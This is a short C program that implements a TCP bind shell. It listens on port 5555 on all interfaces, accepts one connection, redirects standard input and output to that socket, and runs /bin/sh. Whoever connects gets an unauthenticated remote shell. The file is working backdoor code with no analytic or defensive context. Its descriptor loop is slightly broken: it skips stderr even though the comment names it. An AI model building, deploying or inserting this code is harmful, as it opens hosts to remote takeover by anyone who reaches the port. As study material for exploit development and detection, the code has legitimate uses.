#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdint.h>

int main()
{
	uint32_t server_sockid;		//server socket descriptor
	uint32_t client_sockid;		//client socket descriptor
	struct sockaddr_in srvaddr;
	uint32_t i;			//counter

	//create socket
	server_sockid = socket(PF_INET, SOCK_STREAM, 0);

	//initialize sockaddr struct to bind socket using it
	srvaddr.sin_family = AF_INET;
	srvaddr.sin_port = htons(5555);
	srvaddr.sin_addr.s_addr = htonl(INADDR_ANY);

	//bind socket to ip/port in sockaddr struct
	bind(server_sockid, (struct sockaddr *)&srvaddr, sizeof(srvaddr));

	//listen for incoming connection
	listen(server_sockid, 0);

	//accept incoming connection, don't store data, just use the sockfd created
	client_sockid = accept(server_sockid, NULL, NULL);

	//duplicate file descriptors for STDIN, STDOUT, STDERROR
	for (i=0; i<2; i++)
		dup2(client_sockid, i);

	//execute /bin/sh
	execve("/bin/sh", NULL, NULL);
	close(server_sockid);

	return 0;
}
